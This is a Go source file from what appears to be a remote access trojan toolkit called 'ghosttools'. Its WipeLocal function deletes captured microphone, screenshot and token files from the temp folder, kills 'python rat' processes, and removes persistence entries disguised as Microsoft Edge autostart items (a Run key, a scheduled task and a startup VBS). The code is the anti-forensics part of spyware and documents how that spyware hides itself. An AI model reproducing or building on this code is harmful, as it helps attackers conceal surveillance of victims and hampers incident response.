package ui

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// WipeLocal removes traces of ghosttools from this machine.
func WipeLocal() {
	Clear()
	PrintBanner()
	Screen("wipe", "delete all ghosttools traces from this machine")

	base := os.Getenv("TEMP")
	if base == "" {
		base = os.Getenv("TMP")
	}
	if base == "" {
		base = "/tmp"
	}

	targets := []string{
		filepath.Join(base, ".gl_debug.log"),
		filepath.Join(base, ".gl_run_lock"),
		filepath.Join(base, "._gl1"),
		filepath.Join(base, "._gl2"),
		filepath.Join(base, "._gl3"),
		filepath.Join(base, "._glh"),
		filepath.Join(base, "._gltok"),
		filepath.Join(base, "mic.wav"),
		filepath.Join(base, "wp.jpg"),
		filepath.Join(base, "shot.png"),
	}

	fmt.Println("  " + DimCyan("cleaning temporary files..."))
	time.Sleep(200 * time.Millisecond)
	for _, t := range targets {
		if err := os.Remove(t); err == nil {
			fmt.Println("  " + Green("[removed] ") + t)
		}
	}

	// kill any stray python rat processes
	fmt.Println()
	fmt.Println("  " + DimCyan("killing stray processes..."))
	if runtime.GOOS == "windows" {
		exec.Command("taskkill", "/F", "/IM", "python.exe", "/FI", "WINDOWTITLE eq *gl*").Run()
	}

	// remove persistence entries
	fmt.Println()
	fmt.Println("  " + DimCyan("removing persistence..."))
	if runtime.GOOS == "windows" {
		exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "MicrosoftEdgeAutoLaunch", "/f").Run()
		exec.Command("schtasks", "/delete", "/tn",
			"MicrosoftEdgeUpdateTaskMachineCore2", "/f").Run()
		startup := filepath.Join(os.Getenv("APPDATA"),
			"Microsoft", "Windows", "Start Menu", "Programs", "Startup", "MicrosoftEdgeUpdate.vbs")
		os.Remove(startup)
		fmt.Println("  " + Green("[removed] ") + "HKCU run key, scheduled task, startup vbs")
	}

	// clean selfdestruct for logs
	fmt.Println()
	fmt.Println("  " + Green("✓ wipe complete"))
	fmt.Println()
	fmt.Println("  " + DimCyan("press enter to exit..."))
	var s string
	fmt.Scanln(&s)
	os.Exit(0)
}